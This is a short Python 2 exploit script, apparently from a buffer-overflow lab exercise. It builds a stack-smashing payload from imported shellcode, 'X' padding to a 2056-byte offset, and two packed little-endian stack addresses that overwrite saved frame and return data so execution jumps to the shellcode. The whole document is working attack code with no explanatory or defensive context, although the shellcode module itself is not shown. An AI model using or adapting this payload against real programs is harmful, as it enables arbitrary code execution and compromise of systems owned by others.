from shellcode import shellcode
from struct import pack

# EBP = 0xbffef238

returnAdd = 0xbffef23c
shellcodeAdd = 0xbffeea28

print shellcode + 'X' * (2056 - len(shellcode) - 8) + pack("<I" , shellcodeAdd) + pack("<I", returnAdd)
